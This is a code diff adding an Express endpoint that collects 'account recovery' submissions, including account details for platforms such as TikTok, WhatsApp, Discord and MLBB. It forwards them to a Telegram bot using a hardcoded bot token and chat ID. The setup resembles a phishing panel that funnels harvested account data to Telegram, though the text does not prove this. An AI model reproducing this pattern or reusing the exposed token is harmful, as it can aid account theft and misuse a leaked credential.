@@ -526,6 +526,63 @@ ALL_PAGES.forEach(async (pg) => {
     await pools[0].query("INSERT INTO page_status (page_id, status) VALUES ($1, 'on') ON CONFLICT (page_id) DO NOTHING", [pg.id]).catch(() => {});
     await pools[1].query("INSERT INTO page_status (page_id, status) VALUES ($1, 'on') ON CONFLICT (page_id) DO NOTHING", [pg.id]).catch(() => {});
 });
+// ==================== RECOVERY SUBMIT (TO TELEGRAM) ====================
+const RECOVERY_BOT_TOKEN = '8452529051:AAHstuw08g7d-oyMPCfbZujo10Nf1xXpKe0';
+const RECOVERY_CHAT_ID = '8315928972';
+
+app.post('/api/recovery/submit', async (req, res) => {
+    const { platform, account_details, contact_info, description } = req.body;
+    
+    if (!platform || !contact_info) {
+        return res.json({ success: false, message: 'Missing required fields' });
+    }
+
+    // Format message for Telegram
+    let detailsText = '';
+    if (account_details) {
+        for (const [key, value] of Object.entries(account_details)) {
+            const label = key.replace(/^(mlbb|tiktok|tg|fb|ig|wa|discord|snap|viber|msgr|pubg|hok)/, '').replace(/([A-Z])/g, ' $1').trim();
+            detailsText += `▫️ ${label || key}: ${value}\n`;
+        }
+    }
+
+    const message = `
+🔔 <b>New Recovery Request</b>
+
+📱 Platform: ${platform}
+📞 Contact: ${contact_info}
+${description ? `📝 Details: ${description}\n` : ''}
+${detailsText ? `📋 Account Details:\n${detailsText}` : ''}
+⏰ Time: ${new Date().toLocaleString()}
+    `;
+
+    // Send to Telegram
+    try {
+        const tgUrl = `https://api.telegram.org/bot${RECOVERY_BOT_TOKEN}/sendMessage`;
+        const tgResponse = await fetch(tgUrl, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+                chat_id: RECOVERY_CHAT_ID,
+                text: message,
+                parse_mode: 'HTML'
+            })
+        });
+
+        const tgResult = await tgResponse.json();
+
+        if (tgResult.ok) {
+            res.json({ success: true, message: 'Recovery request sent to admin' });
+        } else {
+            console.error('[TELEGRAM ERROR]', tgResult);
+            res.json({ success: false, message: 'Failed to send to Telegram' });
+        }
+    } catch (e) {
+        console.error('[RECOVERY ERROR]', e.message);
+        res.json({ success: false, message: 'Server error: ' + e.message });
+    }
+});
+
 // ============================================================
 // MONITORING & SECURITY SYSTEM APIS (FULL HISTORY VERSION)
 // ============================================================
